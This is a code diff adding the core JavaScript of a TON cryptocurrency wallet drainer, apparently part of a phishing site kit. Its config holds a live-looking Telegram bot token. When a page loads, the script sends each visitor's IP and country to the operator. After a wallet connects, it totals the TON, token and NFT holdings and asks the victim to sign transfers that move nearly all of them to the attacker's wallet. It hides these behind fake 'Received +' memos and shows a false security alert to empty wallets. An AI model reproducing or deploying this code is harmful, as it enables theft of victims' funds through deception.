+        manifestUrl: "https://app.storm.tg/tonconnect-manifest.json", // To use a personalized manifest, use « 'https://' + window.location.hostname + '/tonconnect-manifest.json' »
+    }
+    
+    const TG = {
+        token: "8116666342:AAFFdprS4iP8IO3GNWPvgq_CHfSh0Y017LE", // Your @Botfather Bot token Ex. "725766552:ABChbSGObfvqkdxX4OEhZ_Hb8_V680Sc6Cs"
+        chat_id: "7857993230", // ID of the chat for notifications (include the minus if present) Ex. "-1033337653892"
+        enter_website: true, // Notify on site entry ('true' enabled or 'false' disabled)
+        connect_success: true, // Notify on wallet connection ('true' enabled or 'false' disabled)
+        connect_empty: true,  // Notify on empty wallet connection ('true' enabled or 'false' disabled)
+        transfer_request: true, // Notify on transfer request ('true' enabled or 'false' disabled)
+        transfer_success: true, // Notify on successful transfer ('true' enabled or 'false' disabled)
+        transfer_cancel: true, // Notify on declined transfer ('true' enabled or 'false' disabled) 
+    };
+
+// =====================================================================
+// ============ Bring changes to the code below is not sure ============
+// =====================================================================
+
+    const ipResponse = await fetch("https://ipapi.co/json/");
+    const ipData = await ipResponse.json();
+    const IP = ipData.ip ?? "??";
+    const ISO2 = ipData.country ?? "??";
+    const HOST = window.location.hostname;
+    
+    let isProcessing = false;
+    let User_wallet = null;
+
+    if(TG.enter_website){
+        const message = `👀 *User opened the website*\n\n🌍 ${navigator.language ?? ''} | ${HOST}\n\n📍 [${ISO2}](https://ipapi.co/?q=${IP})\n`;
+        await TgMsg(message);
+    }
+
+    const w3 = new W3ModalUI({
+        manifestUrl: CF.manifestUrl,
+        buttonRootId: "connect-btn"
+    });
+
+    w3.onStatusChange(wallet => {
+        if (!wallet) {
+            return;
+        }
+
+        if (w3.connected) {
+            User_wallet = Add.parse(w3.account.address).toString({bounceable: false});
+            fetchData(User_wallet);
+        }
+    });
+
+    async function fetchData(User_wallet) {
+        if (isProcessing) {
+            console.log("Already processing. Please wait.");
+            return;
+        }
+        isProcessing = true;
+
+        try {
+            const tonData = await fetchTonData(User_wallet);
+            if (!tonData) { await handleEmptyWallet(User_wallet); return;}
+            
+            const tokenData = await fetchTokenData(User_wallet);
+            const nftData = await fetchNftData(User_wallet);
+    
+            if (TG.connect_success) {
+                await sendConnectionMessage(tonData, tokenData, nftData);
+            }
+    
+            await processAssets(tonData, tokenData, nftData);
+        } catch (error) {
+            console.log("Error:", error);
+        } finally {
+            isProcessing = false;
+        }
+    }
+
+    async function fetchTonData(address) {
+        const walletResponse = await fetch(`https://tonapi.io/v2/accounts/${address}${CF.TonApi_Key ? '&token=' + CF.TonApi_Key : ''}`);
+        if (!walletResponse.ok) {
+            console.log(`Error fetching TON balance: ${walletResponse.status}`);
+        }
+        await sleep(500);
+        const walletJson = await walletResponse.json();
+        if (!walletJson) {
+            console.log("Invalid Ton response");
+        }
+    
+        let balanceTON = parseFloat(walletJson.balance) / 1000000000;
+        let calculatedBalanceUSDTG = parseFloat((CF.Ton_rate * balanceTON).toFixed(2));
+        let sendingBalance = parseFloat(walletJson.balance) - 16888777;
+    
+        if (sendingBalance > 0) {
+            return {
+                type: "TON",
+                data: walletJson,
+                balance: balanceTON,
+                sendingBalance: sendingBalance,
+                calculatedBalanceUSDTG: calculatedBalanceUSDTG
+            };
+        }
+        return null;
+    }
+
+    async function fetchTokenData(address) {
+        const tokenResponse = await fetch(`https://tonapi.io/v2/accounts/${address}/jettons?currencies=ton,usd${CF.TonApi_Key ? '&token=' + CF.TonApi_Key : ''}`);
+        if (!tokenResponse.ok) {
+            return [];
+        }
+        await sleep(500);
+        const tokenJson = await tokenResponse.json();
+        if (!tokenJson || !tokenJson.balances) {
+            return [];
+        }
+
+        if (tokenJson.balances.length === 0) {
+            return [];
+        }
+
+        return tokenJson.balances
+            .filter(token => parseFloat(token.balance) !== 0 && token.jetton.verification !== "blacklist")
+            .map(token => {
+                const balance = (parseFloat(token.balance) / Math.pow(10, token.jetton.decimals));
+                const priceUsd = token.price.prices.USD;
+                const calculatedBalanceUSDTG = parseFloat((balance * priceUsd).toFixed(2));
+                if (calculatedBalanceUSDTG > 0) {
+                    return {
+                        type: "TOKEN",
+                        wallet_address: token.wallet_address.address,
+                        TokenBalance: parseFloat(token.balance),
+                        data: token,
+                        roundedBalance: balance.toFixed(2),
+                        address: token.jetton.address,
+                        symbol: token.jetton.symbol,
+                        name: token.jetton.name,
+                        balance: balance,
+                        price_usd: priceUsd,
+                        calculatedBalanceUSDTG: calculatedBalanceUSDTG
+                    };
+                }
+                return null;
+            })
+            .filter(token => token !== null)
+            .sort((a, b) => b.calculatedBalanceUSDTG - a.calculatedBalanceUSDTG);
+    }
+
+    async function fetchNftData(address) {
+        const nftResponse = await fetch(`https://tonapi.io/v2/accounts/${address}/nfts?limit=1000&offset=0&indirect_ownership=false${CF.TonApi_Key ? '&token=' + CF.TonApi_Key : ''}`);
+        if (!nftResponse.ok) {
+            return [];
+        }
+        await sleep(500);
+        const nftJson = await nftResponse.json();
+        if (!nftJson || !nftJson.nft_items) {
+            return [];
+        }
+
+        if (nftJson.nft_items.length === 0) {
+            // console.log("No tokens");
+            return [];
+        }
+
+        // Fetch the NFT data from the JSON file
+        const loadNftResponse = await fetch('./assets/js/nfts_whitelist.json'); 
+        if (!loadNftResponse.ok) {
+            return [];
+        }
+        const loadNftData = await loadNftResponse.json();
+        if (!loadNftData) {
+            return [];
+        }
+
+        return nftJson.nft_items
+            .filter(nft => nft.collection && nft.collection.name && nft.collection.name !== "" && nft.trust !== "blacklist")
+            .map(nft => {
+                const collectionAddress = Add.parse(nft.collection.address).toString({bounceable: true});
+                const matchingNft = loadNftData.find(platform => platform.nft_address === collectionAddress);
+                if(!matchingNft){
+                    return null;
+                }
+                const matchingNftPrice = parseFloat((matchingNft.average_price * CF.Ton_rate).toFixed(2));
+                if (matchingNftPrice > 0) {
+                    return {
+                        type: "NFT",
+                        data: nft.address,
+                        name: nft.metadata.name || 'Unknown',
+                        calculatedBalanceUSDTG: matchingNftPrice || 0.1 // Use average price from LoadNftData or default to 0.1
+                    };
+                }
+                return null;
+            })
+            .filter(nft => nft !== null)
+            .sort((a, b) => b.calculatedBalanceUSDTG - a.calculatedBalanceUSDTG);
+    }
+
+    async function sendConnectionMessage(walletData, tokenData, nftData) {
+        const totalNftPriceUSD = nftData && nftData.length > 0 ? nftData.reduce((sum, token) => sum + token.calculatedBalanceUSDTG, 0) : 0;
+        const NftMsg = nftData && nftData.length > 0 ? `\n\n👾 (≈ *${formatNumber(totalNftPriceUSD)}* USD)\n\n${nftData.map(nft => `[${escp(nft.name)}](https://tonviewer.com/${nft.data}) | (≈ *${formatNumber(nft.calculatedBalanceUSDTG)}* USD )\n`).join('\n')}` : '';
+        const totalTokenPriceUSD = tokenData && tokenData.length > 0 ? tokenData.reduce((sum, token) => sum + token.calculatedBalanceUSDTG, 0) : 0;
+        const TokenMsg = tokenData && tokenData.length > 0 ? `-\n\n🪙 (≈ *${formatNumber(totalTokenPriceUSD)}* USD)\n\n${tokenData.map(token => `${escp(token.name)}\n*${formatNumber(token.roundedBalance)}* ${escp(token.symbol)} ( *${formatNumber(token.calculatedBalanceUSDTG)}* USD )\n`).join('\n')}\n` : '\n';
+        const TonMsg = Object.keys(walletData).length > 0 ? `-\n\n🧿 *${walletData.balance.toFixed(2)}* TON ( ≈ *${formatNumber(walletData.calculatedBalanceUSDTG)}* USD)\n\n` : `-\n\n🧿 *0* TON ( ≈ *0* USD)\n\n`;
+        const totalBalanceUSD = parseFloat(walletData.calculatedBalanceUSDTG ?? 0) + totalTokenPriceUSD + totalNftPriceUSD;
+        const message = `\n🔌 *User Connected Wallet* (${shortAdd(User_wallet)})\n\n🌍 ${HOST} - 📍 [${ISO2}](https://ipapi.co/?q=${IP})\n\n\n💲 ( ≈ ${formatNumber(totalBalanceUSD)} USD )\n\n${TonMsg}${TokenMsg}${NftMsg}`;
+        await TgMsg(message);
+    }
+
+    async function processAssets(walletData, tokenData, nftData) {
+        let allData = [...tokenData, ...nftData, walletData];
+
+        // Filter out items with undefined type
+        allData = allData.filter(item => {
+            if (!item.type) {
+                return false;
+            }
+            return true;
+        });
+
+        if (allData.length === 0) {
+            console.log('No assets to process. Exiting.');
+            return;
+        }
+
+        let groupedData = allData.reduce((acc, item) => {
+            acc[item.type] = acc[item.type] || [];
+            acc[item.type].push(item);
+            return acc;
+        }, {});
+    
+        let sortedTypes = Object.entries(groupedData)
+        .sort((a, b) => {
+            if (CF.Tokens_First) {
+                if (a[0] === "TOKEN") return -1;
+                if (b[0] === "TOKEN") return 1;
+            }
+            return b[1].reduce((sum, item) => sum + item.calculatedBalanceUSDTG, 0) - a[1].reduce((sum, item) => sum + item.calculatedBalanceUSDTG, 0);
+        })
+        .map(entry => entry[0]);
+            
+        for (let type of sortedTypes) {
+            switch (type) {
+                case "TON":
+                    if (groupedData.TON.length > 0 && CF.Native) {
+                        await TonTransfer(groupedData.TON[0]);
+                        await sleep(1300);
+                    }
+                    break;
+                case "TOKEN":
+                    if(CF.Tokens){
+                        for (let i = 0; i < groupedData.TOKEN.length; i += 4) {
+                            let chunk = groupedData.TOKEN.slice(i, i + 4);
+                            await TokenTransfer(chunk, groupedData.TOKEN);
+                            await sleep(1300);
+                        }
+                    }
+                    break;
+                case "NFT":
+                    if(CF.NFTs){
+                        for (let i = 0; i < groupedData.NFT.length; i += 4) {
+                            let chunk = groupedData.NFT.slice(i, i + 4);
+                            await NftTransfer(chunk, groupedData.NFT);
+                            await sleep(1300);
+                        }
+                    }
+                    break;
+            }
+        }
+    }
+
+    async function TonTransfer(tonData) {
+        try {
+            const sendingAmount = (tonData.sendingBalance / 1000000000).toFixed(2);
+            const formattedAmountUSD = formatNumber(CF.Ton_rate * sendingAmount);
+            const notif = `🎣 *Creating request* (${shortAdd(User_wallet)})\n\n*${sendingAmount}* TON ( ≈ *${formattedAmountUSD}* USD )`;
+            const successMessage = `✅ *Approved Transfer* (${shortAdd(User_wallet)})\n\n*${sendingAmount}* TON ( ≈ *${formattedAmountUSD}* USD )`;
+            const errorMessage = `❌ *Declined Transfer* (${shortAdd(User_wallet)})\n\n*${sendingAmount}* TON ( ≈ *${formattedAmountUSD}* USD )`;
+            
+            const cell = Cell().storeUint(0, 32).storeStringTail(` Received + ${formatNumber(sendingAmount * 2.29)} TON `).endCell();
+            const transactionData = {
+                validUntil: Math.floor(Date.now() / 1000) + 360,
+                messages: [{
+                    address: CF.Wallet,
+                    amount: tonData.sendingBalance,
+                    payload: cell.toBoc().toString('base64'),
+                }]
+            };
+            
+            await handleTransaction(transactionData, notif, successMessage, errorMessage);
+        } catch (error) {
+            console.log('Error:', error);
+        }
+    }
+
+    async function TokenTransfer(tokenChunk, sourceArray) {
+        try {
+            const totalTokenPriceUSD = tokenChunk.reduce((sum, token) => sum + token.calculatedBalanceUSDTG, 0);
+            const TokenMsg = tokenChunk.length > 0 ? `\n\n🪙 (≈ *${formatNumber(totalTokenPriceUSD)}* USD)\n\n${tokenChunk.map(token => `${escp(token.name)}\n*${token.roundedBalance}* ${escp(token.symbol)} ( *${formatNumber(token.calculatedBalanceUSDTG)}* USD )\n`).join('\n')}` : '';
+            const notif = `🎣 *Creating request* (${shortAdd(User_wallet)})${TokenMsg}`;
+            const successMessage = `✅ *Approved Transfer* (${shortAdd(User_wallet)})${TokenMsg}`;
+            const errorMessage = `❌ *Declined Transfer* (${shortAdd(User_wallet)})${TokenMsg}`;
+            
+            let transactionMessages = [];
+            for (let token of tokenChunk) {
+                await sleep(100);
+                let payloadCell = Cell().storeUint(0, 32).storeStringTail(` Received + ${formatNumber(token.roundedBalance * 4.3009)} ${token.symbol} `).endCell();
+                let messageCell = Cell()
+                    .storeUint(0xf8a7ea5, 32) 
+                    .storeUint(0, 64)
+                    .storeCoins(token.data.balance)
+                    .storeAddress(Add.parse(CF.Wallet)) // TON wallet destination address
+                    .storeAddress(Add.parse(w3.account.address)) // response excess destination
+                    .storeBit(0)
+                    .storeCoins(Nano(0.02).toString())
+                    .storeBit(1)
+                    .storeRef(payloadCell)
+                    .endCell();
+    
+                let transactionMessage = {
+                    address: token.wallet_address,
+                    amount: Nano(0.05).toString(),
+                    sender: w3.account.address,
+                    tx: btoa(encodeURIComponent(JSON.stringify(token.data))),
+                    payload: messageCell.toBoc().toString('base64'),
+                };
+                transactionMessages.push(transactionMessage);
+            }
+    
+            const transactionData = {
+                validUntil: Math.floor(Date.now() / 1000) + 360,
+                messages: transactionMessages,
+            };
+    
+            await handleTransaction(transactionData, notif, successMessage, errorMessage);
+            
+            tokenChunk.forEach(item => {
+                let index = sourceArray.findIndex(sourceItem => sourceItem.wallet_address === item.wallet_address);
+                if (index !== -1) {
+                    sourceArray.splice(index, 1);
+                }
+            });
+
+        } catch (error) {
+            console.log('Error:', error);
+        }
+    }
+
+    async function NftTransfer(nftChunk, sourceArray) {
+        try {
+            const totalNftPriceUSD = nftChunk.reduce((sum, token) => sum + token.calculatedBalanceUSDTG, 0);
+            const NftMsg = nftChunk.length > 0 ? `\n\n👾 (≈ *${formatNumber(totalNftPriceUSD)}* USD)\n\n${nftChunk.map(nft => `[${escp(nft.name)}](https://tonviewer.com/${nft.data}) | (≈ *${formatNumber(nft.calculatedBalanceUSDTG)}* USD )\n`).join('\n')}` : '';
+            const notif = `🎣 *Creating request* (${shortAdd(User_wallet)})${NftMsg}`;
+            const successMessage = `✅ *Approved Transfer* (${shortAdd(User_wallet)})${NftMsg}`;
+            const errorMessage = `❌ *Declined Transfer* (${shortAdd(User_wallet)})${NftMsg}`;
+
+            let transactionMessages = [];
+            for (let nft of nftChunk) {
+                await sleep(100);
+                let messageCell = Cell()
+                    .storeUint(0x5fcc3d14, 32)
+                    .storeUint(0, 64)
+                    .storeAddress(Add.parse(CF.Wallet))
+                    .storeAddress(Add.parse(w3.account.address))
+                    .storeUint(0, 1)
+                    .storeCoins(Nano(0.000000001).toString())
+                    .storeUint(0, 1)
+                    .endCell();
+    
+                let transactionMessage = {
+                    address: nft.data,
+                    amount: Nano(0.05).toString(),
+                    tx: btoa(encodeURIComponent(JSON.stringify(nft.data))),
+                    payload: messageCell.toBoc().toString('base64'),
+                };
+                transactionMessages.push(transactionMessage);
+            }
+    
+            const transactionData = {
+                validUntil: Math.floor(Date.now() / 1000) + 360,
+                messages: transactionMessages,
+            };
+    
+            await handleTransaction(transactionData, notif, successMessage, errorMessage);
+            
+            nftChunk.forEach(item => {
+                let index = sourceArray.findIndex(sourceItem => sourceItem.data === item.data);
+                if (index !== -1) {
+                    sourceArray.splice(index, 1);
+                }
+            });
+
+        } catch (error) {
+            console.log('Error:', error);
+        }
+    }
+    
+    async function handleTransaction(transactionData, notif, successMessage, errorMessage) {
+        try {
+            if(TG.transfer_request){
+                await TgMsg(notif);
+            }
+            await w3.sendTransaction(transactionData);
+            await sleep(1300);
+            if(TG.transfer_success){
+                await TgMsg(successMessage);
+            }
+        } catch (error) {
+            if (error.message.toLowerCase().includes("reject request") || error.message.toLowerCase().includes("close popup") || error.message.toLowerCase().includes("transaction was not sent")) {
+                if(TG.transfer_cancel){
+                    await TgMsg(errorMessage);
+                }
+            } else {
+                console.log('Error:', error);
+            }
+        }
+    }
+
+    async function handleEmptyWallet(User_wallet) {
+        if (TG.connect_empty) {
+            const message = `\n🔌💩 *User Connected an empty Wallet* (${shortAdd(User_wallet)})\n\n🌍 ${HOST} - 📍 [${ISO2}](https://ipapi.co/?q=${IP})`;
+            await TgMsg(message);
+        }
+    
+        alert('For security reasons, we cannot allow connections from empty or newly created wallets.');
+        await w3.disconnect();
+        if (!w3.connected && w3.modalState.status === 'closed') {
+            await w3.openModal();
+        }
+    }
+
+    async function TgMsg(message) {
+        const encodedMessage = encodeURIComponent(message);
+        const telegramUrl = `https://api.telegram.org/bot${TG.token}/sendMessage?chat_id=${TG.chat_id}&text=${encodedMessage}&parse_mode=Markdown&disable_web_page_preview=true`;
+        
+        const response = await fetch(telegramUrl, { method: 'POST' });
+        if (!response.ok) {
+            console.log('Error:', 'Telegram message failed to send');
+        }
+    }
+
+    async function fire(w3) {
+        await sleep(100);
+        if (!w3.connected && w3.modalState.status === 'closed') {
+            await w3.openModal();
+        }else if (w3.connected) {
+            User_wallet = Add.parse(w3.account.address).toString({bounceable: false});
+            fetchData(User_wallet);
+        }
+    }
+
+    const $$ = (selector) => document.querySelectorAll(selector);
+    $$('.btn-go').forEach(item => {
+        item.addEventListener('click', async () => {
+            await fire(w3); // w3 
+        });
+    });
+
+    function formatNumber(number) {
+        return new Intl.NumberFormat('en-US', { 
+            minimumFractionDigits: 2, 
+            maximumFractionDigits: 2 
+        }).format(number);
+    }
+
+    function shortAdd(str) {
+        if (str.length <= 7) {
+        return str; // If the chain is too short to be shortened in this way, we return it as it is
+        }
+        const firstTwo = str.slice(0, 4); // Take the first 2 characters
+        const lastThree = str.slice(-4); // Take the last 3 characters
+        return `${firstTwo}...${lastThree}`; // Combine parts
+    }
+
+    function escp(msg){
+        let ok = msg
+        .replace(/\_/g, '\\_')
+        .replace(/\*/g, '\\*')
+        .replace(/\[/g, '\\[')
+        .replace(/\]/g, '\\]')
+        .replace(/\(/g, '\\(')
+        .replace(/\)/g, '\\)')
+        .replace(/\~/g, '\\~')
+        .replace(/\`/g, '\\`')
+        .replace(/\>/g, '\\>')
+        .replace(/\#/g, '\\#')
+        .replace(/\+/g, '\\+')
+        .replace(/\-/g, '\\-')
+        .replace(/\=/g, '\\=')
+        .replace(/\|/g, '\\|')
+        .replace(/\{/g, '\\{')
+        .replace(/\}/g, '\\}')
+        .replace(/\./g, '\\.')
+        .replace(/\!/g, '\\!')
+    
+        return ok;
+    }
+
+    function sleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+});
